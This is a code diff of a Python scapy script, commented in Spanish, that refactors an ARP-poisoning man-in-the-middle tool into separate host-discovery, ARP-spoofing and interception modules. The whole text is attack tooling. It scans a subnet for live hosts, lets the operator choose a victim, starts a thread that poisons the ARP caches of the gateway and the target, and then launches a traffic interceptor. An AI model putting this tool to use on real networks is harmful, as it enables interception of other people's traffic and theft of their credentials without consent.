@@ -1,10 +1,9 @@
 from scapy.all import *
-import snake_utils
+import arp_spoof, intercepter, host_discovery
 import threading
 import time
 import os
 import sys
-import signal
 
 def usage():
     print "Usage "
@@ -24,7 +23,7 @@ else :
     target_subnet = sys.argv[2]
     gateway_ip = sys.argv[3]
     #obtener la mac del gateway
-    gateway_mac = snake_utils.get_mac(gateway_ip)
+    gateway_mac = host_discovery.get_mac(gateway_ip)
     # set our interface
     print "[*] Setting up Interface %s" % (interface)
     conf.iface = interface
@@ -44,7 +43,13 @@ fin configuraciones
 """
 # hosts_live sera una lista de tuplas de largo 3, que contendran:
 # ip, mac y vendedor de los dispositivos encontrados en la subnet
-hosts_live = snake_utils.hosts_discovery(target_subnet)
+print "[?] Use the existing cache file for this net? (y/n)"
+ans = raw_input("Answer:")
+if ans == "y":
+    hosts_live = host_discovery.hosts_scan(target_subnet, True)
+else:
+    hosts_live = host_discovery.hosts_scan(target_subnet, False)
+
 if len(hosts_live) != 0 :
     scan_semaphore = True #trigger -> la respuesta 88 del cliente(user_reseponse=88)
     while scan_semaphore :
@@ -59,7 +64,7 @@ if len(hosts_live) != 0 :
         print "[88] -> Poison IP"
         user_response = input("Answer: ")
         if user_response == 99 :
-            hosts_live = snake_utils.hosts_discovery(target_subnet)
+            hosts_live = host_discovery.hosts_scan(target_subnet)
             os.system("clear")#limpiar pantalla
         else:
             try:
@@ -69,11 +74,11 @@ if len(hosts_live) != 0 :
                     target_ip_poison = target_host_poison[0]
                     target_mac_poison = target_host_poison[1]
                     #start arp poisioning atack
-                    poison_thread = threading.Thread(target=snake_utils.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison, lambda : stop_threads))
+                    poison_thread = threading.Thread(target=arp_spoof.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison, lambda : stop_threads))
                     poison_thread.start()
                     time.sleep(2)
                     #start intercepter
-                    snake_utils.intercepter(lambda : stop_threads)
+                    intercepter.intercepter(lambda : stop_threads)
                     
                 else :
                     print "[!] No valid option"
